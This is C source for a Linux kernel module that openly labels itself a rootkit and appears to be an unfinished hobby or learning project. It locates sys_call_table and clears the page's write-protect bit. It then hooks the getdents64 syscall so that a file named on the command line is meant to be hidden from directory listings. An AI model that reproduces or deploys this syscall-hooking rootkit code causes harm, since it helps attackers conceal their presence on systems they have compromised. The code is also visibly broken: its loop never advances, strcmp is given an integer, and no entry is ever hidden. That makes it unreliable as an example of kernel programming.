#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <asm/unistd.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ROYCO");
MODULE_DESCRIPTION("a kernel module rootkit");
MODULE_VERSION("1");


unsigned long (*kallsyms_lookup_name_)(const char *name);

unsigned long kallsyms_lookup_addr;
unsigned long *sys_call_table;

asmlinkage int (*old_getdents64)(const struct pt_regs *regs);
asmlinkage int new_getdents64(const struct pt_regs *regs);

char* file_to_hide; 

// parameters from command line
module_param(kallsyms_lookup_addr, ulong, S_IRUGO);
MODULE_PARM_DESC(kallsyms_lookup_addr, "kallsyms_lookup_name(char *path) function address");
module_param(file_to_hide, charp, 0000);
MODULE_PARM_DESC(file_to_hide, "file to hide from getdents64 syscall");


struct linux_dirent64 {
    u64         d_ino;
    s64         d_off;
    unsigned short      d_reclen;
    unsigned char       d_type;
    char        d_name[];
};



int set_addr_rw(unsigned long _addr) {

        unsigned int level;
        pte_t *pte;

        pte = lookup_address(_addr, &level);

        if (pte->pte &~ _PAGE_RW) {
                pte->pte |= _PAGE_RW;
        }

        return 0;
}

// function to change addr page to ro.
int set_addr_ro(unsigned long _addr) {

        unsigned int level;
        pte_t *pte;

        pte = lookup_address(_addr, &level);
        pte->pte = pte->pte &~_PAGE_RW;

        return 0;
}

static int __init rootkit_enter(void) {

 printk(KERN_INFO "rootkit is operating\n");

 kallsyms_lookup_name_ = (void*)kallsyms_lookup_addr;
 sys_call_table= (unsigned long*)kallsyms_lookup_name_("sys_call_table");

 printk(KERN_INFO "found sys_call_table address: %lx\n",sys_call_table);

 // save old getdents64 function
 old_getdents64 = sys_call_table[__NR_getdents64];

 //replace it with our custom getdents64
 set_addr_rw((unsigned long)sys_call_table);
 sys_call_table[__NR_getdents64] = new_getdents64;
 set_addr_ro((unsigned long)sys_call_table);
 printk(KERN_INFO "switched getdents64 syscall to malicious one");
 return 0;
}

static void __exit rootkit_exit(void) {

 //restore old getdents64 syscall
 set_addr_rw((unsigned long)sys_call_table);
 sys_call_table[__NR_getdents64] = old_getdents64;
 set_addr_ro((unsigned long)sys_call_table);

 printk(KERN_INFO "rootkit stopped\n");
}


asmlinkage int new_getdents64(const struct pt_regs *regs)
{
	int loc;
	struct linux_dirent64 *dirent;
	struct linux_dirent64 *dirent_ker = NULL;
	unsigned int len;
	unsigned int index = 0;

	dirent = (struct linux_dirent64*)(regs->si);

	len = old_getdents64(regs);
	dirent_ker = kzalloc(len, GFP_KERNEL);
	copy_from_user(dirent_ker, dirent, len);
	//printk(KERN_INFO "%lx\n",regs->si);
	//return len;

	//printk(KERN_INFO "%s\n",dirent_ker->d_name);
	
	//iterate through the struct to find if it contains the file we want to hide
	for(index = 0; index < len;)
	{
		
		printk("%s\n",dirent_ker->d_name);
		index += dirent_ker->d_reclen;
		if(strcmp(dirent_ker->d_reclen,file_to_hide) == 0)
		{
			printk(KERN_INFO "secret file was listed.\n");
		}
	}
	return len;
}


module_init(rootkit_enter);
module_exit(rootkit_exit);

